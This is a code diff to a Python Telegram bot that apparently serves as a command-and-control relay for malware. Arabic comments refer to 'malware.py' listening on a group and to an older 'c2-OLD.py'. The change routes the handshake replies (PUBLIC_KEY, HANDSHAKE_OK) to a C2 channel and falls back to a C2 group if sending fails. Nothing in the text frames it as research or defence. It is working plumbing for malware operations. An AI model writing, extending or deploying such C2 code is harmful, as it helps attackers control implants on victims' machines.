@@ -56,10 +56,27 @@ def _load_token() -> str:
 
 async def _send_protocol_reply(context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
     """
-    malware.py يستمع على الجروب فقط — PUBLIC_KEY و HANDSHAKE_OK لازم توصل للجروب مباشرة.
+    كما في c2-OLD.py: ردود PUBLIC_KEY / HANDSHAKE_OK تُرسل للقناة أولاً؛ عند الفشل للجروب.
     """
     try:
-        await context.bot.send_message(chat_id=int(C2_GROUP_ID), text=text)
+        ch = int(C2_CHANNEL_ID)
+        gr = int(C2_GROUP_ID)
+    except ValueError:
+        print("[relay] invalid chat id")
+        return
+    if ch == gr:
+        try:
+            await context.bot.send_message(chat_id=ch, text=text)
+        except Exception as e:
+            print(f"[relay] {e}")
+        return
+    try:
+        await context.bot.send_message(chat_id=ch, text=text)
+        return
+    except Exception as e:
+        print(f"[relay → channel] {e}")
+    try:
+        await context.bot.send_message(chat_id=gr, text=text)
     except Exception as e:
         print(f"[relay → group] {e}")
 
